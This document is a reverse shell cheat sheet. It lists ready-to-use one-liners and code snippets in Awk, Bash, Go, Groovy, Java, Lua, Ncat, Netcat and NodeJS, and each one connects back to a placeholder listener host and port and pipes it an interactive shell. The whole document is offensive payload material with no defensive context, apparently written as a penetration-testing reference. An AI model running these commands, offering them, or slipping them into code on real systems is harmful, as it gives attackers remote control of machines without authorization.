# Reverse Shells

### Awk
```
Method 1:
awk 'BEGIN {s = "/inet/tcp/0/<listener-IP/<listener-port>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### Bash
```
#TCP
Method 1:
bash -i >& /dev/tcp/<listener-IP/<listener-port> 0>&1

Method 2:
0<&196;exec 196<>/dev/tcp/<listener-IP/<listener-port>; sh <&196 >&196 2>&196
```
```
#UDP
Method 1:
sh -i >& /dev/udp/<listener-IP>/<listener-port> 0>&1
* Make sure NC listener uses "-u" to specify UDP
```

### Golang
```
Method 1:
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<listener-IP>:<listener-port>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### Groovy
```
Method 1:
String host="<listener-IP>";
int port=<listener-port>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Java
```
Method 1:
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<listener-IP>/<listener-port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])

Method 2:
String host="<listener-IP>";
int port=<listener-port>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
p.waitFor()
```

### Lua
```
Linux:
lua -e "require('socket');require('os');t=socket.tcp();t:connect('<listener-IP>','<listener-port>');os.execute('/bin/sh -i <&3 >&3 2>&3');"

Windows/Linux:
lua5.1 -e 'local host, port = "<listener-IP>", <listener-port> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

### Ncat
```
#TCP
Method 1:
ncat <listener-IP> <listener-port> -e /bin/bash
Method 1b:
ncat <listener-IP> <listener-port> -e /bin/sh

#UDP
Method 2:
ncat --udp <listener-IP> <listener-port> -e /bin/bash
Method 2b:
ncat --udp <listener-IP> <listener-port> -e /bin/sh
```

### Netcat
```
#Traditional
Method 1:
nc -e /bin/bash <listener-IP> <listener-port>

Method 2:
nc -e /bin/sh <listener-IP> <listener-port>

Method 3:
nc -c bash <listener-IP> <listener-port>

#BSD
Method 1:
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc <listener-IP> <listener-port> 1>/tmp/backpipe

Method 2:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <listener-IP> <listener-port> >/tmp/f
```

### NodeJS
```
Method 1:
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(<listener-port>, "<listener-IP>", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

Method 2:
require('child_process').exec('nc -e /bin/sh <listener-IP> <listener-port>')

Method 3:
-var x = global.process.mainModule.require
-x('child_process').exec('nc <listener-IP> <listener-port> -e /bin/bash')
```
